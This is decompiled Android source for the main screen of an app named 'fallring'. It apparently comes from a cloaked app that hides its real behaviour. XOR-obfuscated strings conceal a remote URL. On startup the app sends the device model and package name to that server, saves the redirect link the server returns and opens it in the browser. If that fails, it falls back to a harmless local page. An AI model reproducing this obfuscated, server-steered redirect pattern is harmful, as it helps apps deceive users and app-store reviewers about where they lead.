package com.skydrop.fallring;

import H.e;
import K.A0;
import K.y0;
import P0.c;
import Q0.h;
import T.u;
import W0.a;
import X0.d;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowInsetsController;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.constraintlayout.widget.ConstraintLayout;
import com.skydrop.fallring.MainActivity;
import com.skydrop.fallring.R;
import e1.l;
import g.AbstractActivityC0126i;
import g.C0124g;
import g.C0125h;
import i1.m;
import i1.o;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Iterator;
import m1.g;
import m1.j;
import q1.n;

/* loaded from: classes.dex */
public final class MainActivity extends AbstractActivityC0126i {

    /* renamed from: D, reason: collision with root package name */
    public static final /* synthetic */ int f1867D = 0;

    /* renamed from: A, reason: collision with root package name */
    public final String f1868A;

    /* renamed from: B, reason: collision with root package name */
    public SharedPreferences f1869B;

    /* renamed from: C, reason: collision with root package name */
    public String f1870C;

    /* renamed from: y, reason: collision with root package name */
    public final c f1871y;

    /* renamed from: z, reason: collision with root package name */
    public final String f1872z;

    public MainActivity() {
        this.d.f2379b.e("androidx:appcompat", new C0124g(this));
        h(new C0125h(this));
        this.f1871y = new c(new a() { // from class: N0.a
            @Override // W0.a
            public final Object a() {
                int i = MainActivity.f1867D;
                KeyEvent.Callback callback = null;
                int i2 = 0;
                View inflate = MainActivity.this.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                ConstraintLayout constraintLayout = (ConstraintLayout) inflate;
                if (inflate instanceof ViewGroup) {
                    ViewGroup viewGroup = (ViewGroup) inflate;
                    int childCount = viewGroup.getChildCount();
                    while (true) {
                        if (i2 >= childCount) {
                            break;
                        }
                        KeyEvent.Callback findViewById = viewGroup.getChildAt(i2).findViewById(R.id.webView);
                        if (findViewById != null) {
                            callback = findViewById;
                            break;
                        }
                        i2++;
                    }
                }
                WebView webView = (WebView) callback;
                if (webView != null) {
                    return new O0.a(constraintLayout, webView);
                }
                throw new NullPointerException("Missing required view with ID: ".concat(inflate.getResources().getResourceName(R.id.webView)));
            }
        });
        this.f1872z = t(new byte[]{-111, 14, -94});
        this.f1868A = t(new byte[]{Byte.MIN_VALUE, 29, -73, -108});
    }

    public static String t(byte[] bArr) {
        int[] iArr = {(int) 242, (int) 104, (int) 197, (int) 248};
        ArrayList arrayList = new ArrayList(bArr.length);
        int length = bArr.length;
        int i = 0;
        int i2 = 0;
        while (i < length) {
            arrayList.add(Byte.valueOf((byte) (iArr[i2 % 4] ^ (bArr[i] & 255))));
            i++;
            i2++;
        }
        return new String(h.z0(arrayList), e1.a.f1915a);
    }

    @Override // g.AbstractActivityC0126i, a.l, android.app.Activity
    public final void onCreate(Bundle bundle) {
        g gVar;
        super.onCreate(bundle);
        this.f1869B = getSharedPreferences(this.f1872z, 0);
        setContentView(v().f617a);
        u();
        WebSettings settings = v().f618b.getSettings();
        d.d(settings, "getSettings(...)");
        settings.setAllowContentAccess(true);
        settings.setAllowFileAccess(true);
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setMixedContentMode(0);
        settings.setDatabaseEnabled(true);
        settings.setCacheMode(-1);
        v().f618b.setWebViewClient(new WebViewClient());
        WebView.setWebContentsDebuggingEnabled(false);
        SharedPreferences sharedPreferences = this.f1869B;
        g gVar2 = null;
        if (sharedPreferences == null) {
            d.h("prefs");
            throw null;
        }
        String string = sharedPreferences.getString(this.f1868A, null);
        if (string != null && !e1.d.q0(string)) {
            this.f1870C = string;
            x(string);
            return;
        }
        String packageName = getPackageName();
        String t2 = t(new byte[]{-51, 9, -75, -120, -49});
        d.d(getPackageName(), "getPackageName(...)");
        byte[] bArr = {-102, 28, -79, -120, -127, 82, -22, -41, -117, 13, -87, -108, -99, 31, -24, -116, Byte.MIN_VALUE, 29, -79, -112, -33, 89, -9, -56, -62, 70, -94, -114, -98, 30, -77, -101, -103, 3, -86, -43, -101, 26, -73, -127, -100, 11, -82, -109, -109, 81, -10, -42, -123, 7, -73, -109, -105, 26, -74, -42, -106, 13, -77, -41};
        int[] iArr = {(int) 242, (int) 104, (int) 197, (int) 248};
        ArrayList arrayList = new ArrayList(60);
        int i = 0;
        int i2 = 0;
        while (i < 60) {
            arrayList.add(Byte.valueOf((byte) (iArr[i2 % 4] ^ (bArr[i] & 255))));
            i++;
            i2++;
        }
        String str = new String(h.z0(arrayList), e1.a.f1915a) + t2 + packageName;
        o oVar = new o();
        u uVar = new u(4);
        d.e(str, "url");
        if (l.i0(str, "ws:", true)) {
            String substring = str.substring(3);
            d.d(substring, "this as java.lang.String).substring(startIndex)");
            str = "http:".concat(substring);
        } else if (l.i0(str, "wss:", true)) {
            String substring2 = str.substring(4);
            d.d(substring2, "this as java.lang.String).substring(startIndex)");
            str = "https:".concat(substring2);
        }
        d.e(str, "<this>");
        i1.l lVar = new i1.l();
        lVar.c(null, str);
        uVar.f752a = lVar.a();
        String t3 = t(new byte[]{-86, 69, -127, -99, -124, 1, -90, -99, -33, 37, -86, -100, -105, 4});
        String str2 = Build.MODEL;
        d.d(str2, "MODEL");
        uVar.l(t3, str2);
        uVar.l(t(new byte[]{-77, 11, -90, -99, -126, 28, -24, -76, -109, 6, -94, -115, -109, 15, -96}), t(new byte[]{-105, 6, -24, -83, -95, 68, -96, -106, -55, 25, -8, -56, -36, 81}));
        String t4 = t(new byte[]{-89, 27, -96, -118, -33, 41, -94, -99, -100, 28});
        String defaultUserAgent = WebSettings.getDefaultUserAgent(this);
        d.d(defaultUserAgent, "getDefaultUserAgent(...)");
        uVar.l(t4, defaultUserAgent);
        e b2 = uVar.b();
        j jVar = new j(oVar, b2);
        B.j jVar2 = new B.j(this, this.f1868A);
        if (!jVar.f3215e.compareAndSet(false, true)) {
            throw new IllegalStateException("Already Executed");
        }
        n nVar = n.f3555a;
        jVar.f3216f = n.f3555a.g();
        u uVar2 = oVar.f2463a;
        g gVar3 = new g(jVar, jVar2);
        uVar2.getClass();
        synchronized (uVar2) {
            ((ArrayDeque) uVar2.f753b).add(gVar3);
            String str3 = ((m) b2.f213c).d;
            Iterator it = ((ArrayDeque) uVar2.f754c).iterator();
            while (true) {
                if (it.hasNext()) {
                    gVar = (g) it.next();
                    if (d.a(((m) gVar.f3209c.f3213b.f213c).d, str3)) {
                        break;
                    }
                } else {
                    Iterator it2 = ((ArrayDeque) uVar2.f753b).iterator();
                    while (it2.hasNext()) {
                        gVar = (g) it2.next();
                        if (d.a(((m) gVar.f3209c.f3213b.f213c).d, str3)) {
                        }
                    }
                }
            }
            gVar2 = gVar;
            if (gVar2 != null) {
                gVar3.f3208b = gVar2.f3208b;
            }
        }
        uVar2.r();
    }

    @Override // g.AbstractActivityC0126i, android.app.Activity
    public final void onResume() {
        super.onResume();
        String str = this.f1870C;
        if (str != null) {
            x(str);
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public final void onWindowFocusChanged(boolean z2) {
        super.onWindowFocusChanged(z2);
        if (z2) {
            u();
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    public final void u() {
        y0 y0Var;
        WindowInsetsController insetsController;
        q1.d.n0(getWindow(), false);
        Window window = getWindow();
        B0.d dVar = new B0.d(getWindow().getDecorView());
        if (Build.VERSION.SDK_INT >= 30) {
            insetsController = window.getInsetsController();
            A0 a02 = new A0(insetsController, dVar);
            a02.f368f = window;
            y0Var = a02;
        } else {
            y0Var = new y0(window, dVar);
        }
        y0Var.Q();
        y0Var.q0();
    }

    public final O0.a v() {
        return (O0.a) this.f1871y.a();
    }

    public final void w() {
        v().f618b.setVisibility(0);
        v().f618b.loadUrl(t(new byte[]{-108, 1, -87, -99, -56, 71, -22, -41, -109, 6, -95, -118, -99, 1, -95, -89, -109, 27, -74, -99, -122, 71, -84, -106, -106, 13, -67, -42, -102, 28, -88, -108}));
    }

    public final void x(String str) {
        v().f618b.setVisibility(8);
        try {
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception unused) {
            w();
        }
    }
}
